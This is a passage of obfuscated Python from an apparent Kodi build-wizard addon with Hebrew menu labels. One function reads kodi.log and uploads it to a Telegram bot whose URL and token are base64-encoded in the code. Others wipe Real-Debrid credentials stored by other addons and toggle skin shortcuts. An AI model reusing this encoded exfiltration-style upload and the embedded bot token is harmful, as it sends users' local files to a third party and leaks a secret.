         OOOOOO0O0000O00O0 =xbmc .translatePath ('special://home/kodi.log')#line:580
         OO000O0OOO0OOO00O ={'chat_id':(None ,'-274262389'),'document':(OOOOOO0O0000O00O0 ,open (OOOOOO0O0000O00O0 ,'rb')),}#line:584
         O00000OOO0OOOO0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:585
         OOOOOOOO0OO0O000O =requests .post (O00000OOO0OOOO0OO .decode ('base64'),files =OO000O0OOO0OOO00O )#line:587
      elif xbmc .getCondVisibility ('system.platform.android'):#line:588
           OOOOOO0O0000O00O0 =xbmc .translatePath ('special://temp/kodi.log')#line:589
           OO000O0OOO0OOO00O ={'chat_id':(None ,'-274262389'),'document':(OOOOOO0O0000O00O0 ,open (OOOOOO0O0000O00O0 ,'rb')),}#line:593
           O00000OOO0OOOO0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:594
           OOOOOOOO0OO0O000O =requests .post (O00000OOO0OOOO0OO .decode ('base64'),files =OO000O0OOO0OOO00O )#line:596
      else :#line:597
           OOOOOO0O0000O00O0 =xbmc .translatePath ('special://kodi.log')#line:598
           OO000O0OOO0OOO00O ={'chat_id':(None ,'-274262389'),'document':(OOOOOO0O0000O00O0 ,open (OOOOOO0O0000O00O0 ,'rb')),}#line:602
           O00000OOO0OOOO0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:603
           OOOOOOOO0OO0O000O =requests .post (O00000OOO0OOOO0OO .decode ('base64'),files =OO000O0OOO0OOO00O )#line:605
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:606
def rdoff ():#line:608
	OOO0OOOO000000OO0 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:609
	OOO0OOOO000000OO0 .setSetting ('rd.client_id','')#line:610
	OOO0OOOO000000OO0 .setSetting ('rd.secret','')#line:611
	OOO0OOOO000000OO0 .setSetting ('rdsource','false')#line:612
	OOO0OOOO000000OO0 .setSetting ('super_fast_type_toren','false')#line:613
	OOO0OOOO000000OO0 .setSetting ('rd.auth','false')#line:614
	OOO0OOOO000000OO0 .setSetting ('rd.refresh','false')#line:615
	OOO0OOOO000000OO0 =xbmcaddon .Addon ('script.module.resolveurl')#line:617
	OOO0OOOO000000OO0 .setSetting ('RealDebridResolver_client_id','')#line:618
	OOO0OOOO000000OO0 .setSetting ('RealDebridResolver_client_secret','')#line:619
	OOO0OOOO000000OO0 .setSetting ('RealDebridResolver_token','')#line:620
	OOO0OOOO000000OO0 .setSetting ('RealDebridResolver_refresh','')#line:621
	OOO0OOOO000000OO0 =xbmcaddon .Addon ('plugin.video.seren')#line:623
	OOO0OOOO000000OO0 .setSetting ('rd.client_id','')#line:624
	OOO0OOOO000000OO0 .setSetting ('rd.secret','')#line:625
	OOO0OOOO000000OO0 .setSetting ('rd.auth','')#line:626
	OOO0OOOO000000OO0 .setSetting ('rd.refresh','')#line:627
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:628
		OOO0OOOO000000OO0 =xbmcaddon .Addon ('plugin.video.gaia')#line:629
		OOO0OOOO000000OO0 .setSetting ('accounts.debrid.realdebrid.id','')#line:630
		OOO0OOOO000000OO0 .setSetting ('accounts.debrid.realdebrid.secret','')#line:631
		OOO0OOOO000000OO0 .setSetting ('accounts.debrid.realdebrid.token','')#line:632
		OOO0OOOO000000OO0 .setSetting ('accounts.debrid.realdebrid.refresh','')#line:633
	resloginit .resloginit ('restore','all')#line:634
	OO0OOO0000O0O0O00 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:636
	O00000O0OOO0OOO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:637
	copyfile (OO0OOO0000O0O0O00 ,O00000O0OOO0OOO0O )#line:638
def skindialogsettind18 ():#line:639
	try :#line:640
		O00OOO00O00OO000O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:641
		OO00O0O0O0OO000O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:642
		copyfile (O00OOO00O00OO000O ,OO00O0O0O0OO000O0 )#line:643
	except :pass #line:644
def rdon ():#line:645
	loginit .loginIt ('restore','all')#line:646
	OOOOO0OOOOO00OOO0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:648
	O0O000OOOO00OOO00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:649
	copyfile (OOOOO0OOOOO00OOO0 ,O0O000OOOO00OOO00 )#line:650
def adults18 ():#line:652
  O0OOO00000O000O0O =(ADDON .getSetting ("adults"))#line:653
  if O0OOO00000O000O0O =='true':#line:654
    OO0OOO00OOOO0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:655
    with open (OO0OOO00OOOO0O00O ,'r')as O0OOOOOO00O0OOOOO :#line:656
      OOO0O0000O0000000 =O0OOOOOO00O0OOOOO .read ()#line:657
    OOO0O0000O0000000 =OOO0O0000O0000000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:675
    with open (OO0OOO00OOOO0O00O ,'w')as O0OOOOOO00O0OOOOO :#line:678
      O0OOOOOO00O0OOOOO .write (OOO0O0000O0000000 )#line:679
def rdbuildaddon ():#line:680
  OO0OO000O0OO0OO0O =(ADDON .getSetting ("auto_rd"))#line:681
  if OO0OO000O0OO0OO0O =='true':#line:682
    OO0OO0OOOO0OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:683
    with open (OO0OO0OOOO0OOOO0O ,'r')as OOO0OO00OOO0O000O :#line:684
      O0O000OOOOO00OO0O =OOO0OO00OOO0O000O .read ()#line:685
    O0O000OOOOO00OO0O =O0O000OOOOO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:703
    with open (OO0OO0OOOO0OOOO0O ,'w')as OOO0OO00OOO0O000O :#line:706
      OOO0OO00OOO0O000O .write (O0O000OOOOO00OO0O )#line:707
    OO0OO0OOOO0OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:711
    with open (OO0OO0OOOO0OOOO0O ,'r')as OOO0OO00OOO0O000O :#line:712
      O0O000OOOOO00OO0O =OOO0OO00OOO0O000O .read ()#line:713
    O0O000OOOOO00OO0O =O0O000OOOOO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:731
    with open (OO0OO0OOOO0OOOO0O ,'w')as OOO0OO00OOO0O000O :#line:734
      OOO0OO00OOO0O000O .write (O0O000OOOOO00OO0O )#line:735
    OO0OO0OOOO0OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:739
    with open (OO0OO0OOOO0OOOO0O ,'r')as OOO0OO00OOO0O000O :#line:740
      O0O000OOOOO00OO0O =OOO0OO00OOO0O000O .read ()#line:741
    O0O000OOOOO00OO0O =O0O000OOOOO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:759
    with open (OO0OO0OOOO0OOOO0O ,'w')as OOO0OO00OOO0O000O :#line:762
      OOO0OO00OOO0O000O .write (O0O000OOOOO00OO0O )#line:763
    OO0OO0OOOO0OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:767
    with open (OO0OO0OOOO0OOOO0O ,'r')as OOO0OO00OOO0O000O :#line:768
      O0O000OOOOO00OO0O =OOO0OO00OOO0O000O .read ()#line:769
    O0O000OOOOO00OO0O =O0O000OOOOO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:787
    with open (OO0OO0OOOO0OOOO0O ,'w')as OOO0OO00OOO0O000O :#line:790
      OOO0OO00OOO0O000O .write (O0O000OOOOO00OO0O )#line:791
    OO0OO0OOOO0OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:794
    with open (OO0OO0OOOO0OOOO0O ,'r')as OOO0OO00OOO0O000O :#line:795
      O0O000OOOOO00OO0O =OOO0OO00OOO0O000O .read ()#line:796
    O0O000OOOOO00OO0O =O0O000OOOOO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:814
    with open (OO0OO0OOOO0OOOO0O ,'w')as OOO0OO00OOO0O000O :#line:817
      OOO0OO00OOO0O000O .write (O0O000OOOOO00OO0O )#line:818
    OO0OO0OOOO0OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:820
    with open (OO0OO0OOOO0OOOO0O ,'r')as OOO0OO00OOO0O000O :#line:821
      O0O000OOOOO00OO0O =OOO0OO00OOO0O000O .read ()#line:822
    O0O000OOOOO00OO0O =O0O000OOOOO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:840
    with open (OO0OO0OOOO0OOOO0O ,'w')as OOO0OO00OOO0O000O :#line:843
      OOO0OO00OOO0O000O .write (O0O000OOOOO00OO0O )#line:844
    OO0OO0OOOO0OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:846
    with open (OO0OO0OOOO0OOOO0O ,'r')as OOO0OO00OOO0O000O :#line:847
      O0O000OOOOO00OO0O =OOO0OO00OOO0O000O .read ()#line:848
    O0O000OOOOO00OO0O =O0O000OOOOO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:866
    with open (OO0OO0OOOO0OOOO0O ,'w')as OOO0OO00OOO0O000O :#line:869
      OOO0OO00OOO0O000O .write (O0O000OOOOO00OO0O )#line:870
    OO0OO0OOOO0OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:873
    with open (OO0OO0OOOO0OOOO0O ,'r')as OOO0OO00OOO0O000O :#line:874
      O0O000OOOOO00OO0O =OOO0OO00OOO0O000O .read ()#line:875
    O0O000OOOOO00OO0O =O0O000OOOOO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:893
    with open (OO0OO0OOOO0OOOO0O ,'w')as OOO0OO00OOO0O000O :#line:896
      OOO0OO00OOO0O000O .write (O0O000OOOOO00OO0O )#line:897
def rdbuildinstall ():#line:900
  try :#line:901
   O0O0O000O000O0O0O =(ADDON .getSetting ("auto_rd"))#line:902
   if O0O0O000O000O0O0O =='true':#line:903
     OOOO0OO00O00OOOO0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:904
     O0OOOO0O0000OOO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:905
     copyfile (OOOO0OO00O00OOOO0 ,O0OOOO0O0000OOO0O )#line:906
  except :#line:907
     pass #line:908
def rdbuildaddonoff ():#line:911
    OO00O0OOO0OOOO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:914
    with open (OO00O0OOO0OOOO0O0 ,'r')as OOO0O0O000O00OO00 :#line:915
      O0OO0OO0OO00OO00O =OOO0O0O000O00OO00 .read ()#line:916
    O0OO0OO0OO00OO00O =O0OO0OO0OO00OO00O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:934
    with open (OO00O0OOO0OOOO0O0 ,'w')as OOO0O0O000O00OO00 :#line:937
      OOO0O0O000O00OO00 .write (O0OO0OO0OO00OO00O )#line:938
    OO00O0OOO0OOOO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:942
    with open (OO00O0OOO0OOOO0O0 ,'r')as OOO0O0O000O00OO00 :#line:943
      O0OO0OO0OO00OO00O =OOO0O0O000O00OO00 .read ()#line:944
    O0OO0OO0OO00OO00O =O0OO0OO0OO00OO00O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:962
    with open (OO00O0OOO0OOOO0O0 ,'w')as OOO0O0O000O00OO00 :#line:965
      OOO0O0O000O00OO00 .write (O0OO0OO0OO00OO00O )#line:966
    OO00O0OOO0OOOO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:970
    with open (OO00O0OOO0OOOO0O0 ,'r')as OOO0O0O000O00OO00 :#line:971
      O0OO0OO0OO00OO00O =OOO0O0O000O00OO00 .read ()#line:972
    O0OO0OO0OO00OO00O =O0OO0OO0OO00OO00O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:990
    with open (OO00O0OOO0OOOO0O0 ,'w')as OOO0O0O000O00OO00 :#line:993
      OOO0O0O000O00OO00 .write (O0OO0OO0OO00OO00O )#line:994
    OO00O0OOO0OOOO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:998
    with open (OO00O0OOO0OOOO0O0 ,'r')as OOO0O0O000O00OO00 :#line:999
      O0OO0OO0OO00OO00O =OOO0O0O000O00OO00 .read ()#line:1000
    O0OO0OO0OO00OO00O =O0OO0OO0OO00OO00O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1018
    with open (OO00O0OOO0OOOO0O0 ,'w')as OOO0O0O000O00OO00 :#line:1021
      OOO0O0O000O00OO00 .write (O0OO0OO0OO00OO00O )#line:1022
    OO00O0OOO0OOOO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1025
    with open (OO00O0OOO0OOOO0O0 ,'r')as OOO0O0O000O00OO00 :#line:1026
      O0OO0OO0OO00OO00O =OOO0O0O000O00OO00 .read ()#line:1027
    O0OO0OO0OO00OO00O =O0OO0OO0OO00OO00O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1045
    with open (OO00O0OOO0OOOO0O0 ,'w')as OOO0O0O000O00OO00 :#line:1048
      OOO0O0O000O00OO00 .write (O0OO0OO0OO00OO00O )#line:1049
    OO00O0OOO0OOOO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1051
    with open (OO00O0OOO0OOOO0O0 ,'r')as OOO0O0O000O00OO00 :#line:1052
      O0OO0OO0OO00OO00O =OOO0O0O000O00OO00 .read ()#line:1053
    O0OO0OO0OO00OO00O =O0OO0OO0OO00OO00O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1071
    with open (OO00O0OOO0OOOO0O0 ,'w')as OOO0O0O000O00OO00 :#line:1074
      OOO0O0O000O00OO00 .write (O0OO0OO0OO00OO00O )#line:1075
    OO00O0OOO0OOOO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1077
    with open (OO00O0OOO0OOOO0O0 ,'r')as OOO0O0O000O00OO00 :#line:1078
      O0OO0OO0OO00OO00O =OOO0O0O000O00OO00 .read ()#line:1079
    O0OO0OO0OO00OO00O =O0OO0OO0OO00OO00O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1097
    with open (OO00O0OOO0OOOO0O0 ,'w')as OOO0O0O000O00OO00 :#line:1100
      OOO0O0O000O00OO00 .write (O0OO0OO0OO00OO00O )#line:1101
    OO00O0OOO0OOOO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1104
    with open (OO00O0OOO0OOOO0O0 ,'r')as OOO0O0O000O00OO00 :#line:1105
      O0OO0OO0OO00OO00O =OOO0O0O000O00OO00 .read ()#line:1106
    O0OO0OO0OO00OO00O =O0OO0OO0OO00OO00O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1124
    with open (OO00O0OOO0OOOO0O0 ,'w')as OOO0O0O000O00OO00 :#line:1127
      OOO0O0O000O00OO00 .write (O0OO0OO0OO00OO00O )#line:1128
def rdbuildinstalloff ():#line:1131
    try :#line:1132
       OOO00OOOO0OO0OO00 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1133
       O00OO0O0O000O0000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1134
       copyfile (OOO00OOOO0OO0OO00 ,O00OO0O0O000O0000 )#line:1136
       OOO00OOOO0OO0OO00 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1138
       O00OO0O0O000O0000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1139
       copyfile (OOO00OOOO0OO0OO00 ,O00OO0O0O000O0000 )#line:1141
       OOO00OOOO0OO0OO00 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1143
       O00OO0O0O000O0000 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1144
       copyfile (OOO00OOOO0OO0OO00 ,O00OO0O0O000O0000 )#line:1146
       OOO00OOOO0OO0OO00 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1149
       O00OO0O0O000O0000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1150
       copyfile (OOO00OOOO0OO0OO00 ,O00OO0O0O000O0000 )#line:1152
    except :#line:1154
       pass #line:1155
def rdbuildaddonON ():#line:1162
    OO0O00O0OOO0OOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1164
    with open (OO0O00O0OOO0OOO00 ,'r')as OOOOO0000O0OOO0OO :#line:1165
      O0OO0OO00000O00OO =OOOOO0000O0OOO0OO .read ()#line:1166
    O0OO0OO00000O00OO =O0OO0OO00000O00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1184
